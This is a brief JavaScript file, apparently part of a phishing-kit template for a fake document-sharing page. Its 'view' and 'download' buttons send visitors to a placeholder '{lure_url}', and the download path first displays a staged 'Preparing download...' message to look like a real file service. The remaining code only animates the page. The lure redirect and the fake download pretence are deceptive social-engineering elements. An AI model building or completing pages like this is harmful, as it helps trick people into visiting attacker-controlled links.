function viewDocument() {
    window.location.href = '{lure_url}';
}

function downloadDocument() {
    // Show a brief "processing" message before redirecting
    const btn = document.querySelector('.btn-secondary');
    const originalText = btn.innerHTML;
    btn.innerHTML = '<span>Preparing download...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

// Add loading animation for buttons
document.querySelectorAll('button').forEach(btn => {
    btn.addEventListener('click', function() {
        if (!this.disabled) {
            this.style.transform = 'scale(0.98)';
            setTimeout(() => {
                this.style.transform = 'scale(1)';
            }, 100);
        }
    });
});

// Animate elements on page load
document.addEventListener('DOMContentLoaded', () => {
    const card = document.querySelector('.document-card');
    card.style.opacity = '0';
    card.style.transform = 'translateY(20px)';
    
    setTimeout(() => {
        card.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
        card.style.opacity = '1';
        card.style.transform = 'translateY(0)';
    }, 100);
});
